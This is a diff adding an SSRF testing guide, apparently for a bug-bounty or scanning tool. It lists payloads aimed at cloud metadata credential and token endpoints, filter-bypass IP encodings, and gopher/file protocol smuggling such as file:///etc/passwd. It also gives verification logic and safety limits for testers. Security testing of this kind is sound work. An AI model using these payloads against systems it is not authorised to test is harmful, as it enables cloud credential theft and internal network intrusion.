@@ -1,0 +1,159 @@
+VULNERABILITY TYPE: Server-Side Request Forgery (SSRF)
+
+DESCRIPTION:
+SSRF vulnerabilities allow attackers to make the server send HTTP requests to arbitrary destinations. This can be used to access internal services, cloud metadata endpoints, or perform port scanning through the vulnerable server.
+
+DETECTION INDICATORS:
+- Parameters that accept URLs (url, link, uri, href, webhook, callback)
+- File upload from URL functionality
+- Image/document fetching from external sources
+- Proxy or redirect parameters
+- RSS/feed readers
+- API endpoints that fetch remote resources
+- PDF generators that accept URLs
+- Web scraping or preview features
+- oEmbed or link preview functionality
+
+PAYLOAD GENERATION IDEAS:
+1. Internal network access:
+   - http://localhost
+   - http://127.0.0.1
+   - http://0.0.0.0
+   - http://[::1]
+   - http://169.254.169.254 (AWS metadata)
+   - http://metadata.google.internal (GCP metadata)
+   - http://192.168.1.1 (internal IPs)
+   - http://10.0.0.1
+   - http://172.16.0.1
+
+2. Cloud metadata endpoints:
+   - http://169.254.169.254/latest/meta-data/ (AWS)
+   - http://metadata.google.internal/computeMetadata/v1/ (GCP)
+   - http://169.254.169.254/metadata/instance (Azure)
+
+3. Bypass filters:
+   - http://127.0.0.1@example.com (parse confusion)
+   - http://localhost%00.example.com (null byte)
+   - http://127.1 (short IP)
+   - http://0x7f.0x0.0x0.0x1 (hex IP)
+   - http://2130706433 (decimal IP)
+   - http://spoofed.burpcollaborator.net (DNS rebinding)
+   - http://[::ffff:127.0.0.1] (IPv6 notation)
+
+4. Protocol smuggling:
+   - file:///etc/passwd
+   - gopher://localhost:6379/_SET
+   - dict://localhost:11211/stats
+   - ftp://internal-server
+
+5. Port scanning:
+   - http://localhost:80
+   - http://localhost:443
+   - http://localhost:3306 (MySQL)
+   - http://localhost:6379 (Redis)
+   - http://localhost:27017 (MongoDB)
+
+TESTING STRATEGY:
+1. Identify URL input points:
+   - Look for parameters that accept URLs
+   - Test file upload from URL features
+   - Check API documentation for URL parameters
+
+2. Test local access:
+   - Try accessing localhost/127.0.0.1
+   - Check response for different content than normal URLs
+   - Look for timeout differences (open vs closed ports)
+
+3. Test cloud metadata:
+   - If running on AWS/GCP/Azure, try metadata endpoints
+   - Look for AWS keys, instance data, or tokens
+
+4. Test internal network access:
+   - Try common internal IP ranges
+   - Attempt to access internal services
+
+5. Verify out-of-band:
+   - Use Burp Collaborator or similar
+   - Check if server makes DNS lookup
+   - Verify HTTP requests to your server
+
+6. Check for blind SSRF:
+   - Even without visible response, check timing
+   - Use out-of-band techniques
+   - Test for DNS resolution
+
+VERIFICATION LOGIC:
+TRUE POSITIVE indicators:
+- Response contains localhost/127.0.0.1 content
+- Cloud metadata is returned (AWS keys, instance data)
+- Internal service responses are visible
+- Different response for localhost vs external URLs
+- DNS lookup to your controlled domain (via Burp Collaborator)
+- HTTP request logged on your server
+- Response reveals internal service banners
+- Timeout differences indicate port state
+
+FALSE POSITIVE indicators:
+- Error message "Invalid URL" or "Blocked"
+- Same response for all URLs (cached or default)
+- WAF blocking message
+- URL validation preventing internal addresses
+- No network activity to your controlled domain
+- Generic error without indication of request attempt
+- Response identical to normal error page
+
+SEVERITY ASSESSMENT:
+- Critical: Access to cloud metadata with credentials, or internal admin panels
+- High: Access to internal services, port scanning, or data exfiltration
+- Medium: Blind SSRF with limited exploitation potential
+- Low: SSRF to external URLs only without internal access
+- Info: URL parameter exists but has no exploitable SSRF
+
+BUG BOUNTY SAFETY:
+- Do NOT access or exfiltrate sensitive data if found
+- Do NOT perform aggressive port scanning
+- Do NOT use SSRF to attack other systems
+- Stop at proof-of-concept (e.g., showing metadata access)
+- Do NOT retrieve AWS keys or other credentials
+- Use your own controlled domain for testing
+- Avoid impacting service availability
+
+COMMON VULNERABLE FEATURES:
+- PDF generators (WeasyPrint, wkhtmltopdf)
+- Image processors (ImageMagick with URL support)
+- Webhook consumers
+- Link preview generators
+- RSS/Atom feed readers
+- File upload from URL
+- URL shortener expanders
+- oEmbed consumers
+
+CLOUD-SPECIFIC TESTS:
+AWS:
+- http://169.254.169.254/latest/meta-data/iam/security-credentials/
+- http://169.254.169.254/latest/user-data/
+- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/
+
+GCP:
+- http://metadata.google.internal/computeMetadata/v1/
+- http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+Azure:
+- http://169.254.169.254/metadata/instance?api-version=2021-02-01
+- http://169.254.169.254/metadata/identity/oauth2/token
+
+PROTOCOL-BASED EXPLOITATION:
+- Gopher: Can interact with Redis, Memcached, SMTP
+- File: Can read local files if supported
+- FTP: Can interact with internal FTP servers
+- Dict: Can query Dict servers
+
+BYPASS TECHNIQUES:
+1. DNS rebinding
+2. URL parser confusion
+3. IPv6 notation
+4. Decimal/hexadecimal IP encoding
+5. CIDR bypass
+6. Redirect chains
+7. URL encoding
+8. Unicode normalization
